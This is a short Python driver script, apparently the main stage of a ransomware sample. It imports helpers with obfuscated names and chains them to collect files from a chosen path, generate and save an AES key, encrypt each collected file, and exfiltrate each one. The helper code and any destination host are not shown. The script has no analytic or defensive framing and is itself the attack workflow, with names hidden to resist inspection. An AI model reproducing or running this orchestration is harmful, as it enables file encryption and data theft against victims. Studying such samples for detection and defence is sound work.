from task_2_obs import qx99       # File collection
from task_3_obs import z91, s2v, j8f   # AES keygen/save/encrypt
from task_4_exfiltrate_obs import r9  # Exfiltration

# Task 2: Collect files
path = input("Specify the path to use: ")
qx99(path)

# Task 3: Encrypt files
k = z91()
s2v(k)

try:
    with open('f.tmp', 'r') as f:
        paths = [i.strip() for i in f if i.strip()]
except FileNotFoundError:
    print("f.tmp not found.")
    exit()

for p in paths:
    j8f(p, k)

# Task 4: Exfiltrate
for p in paths:
    r9(p)
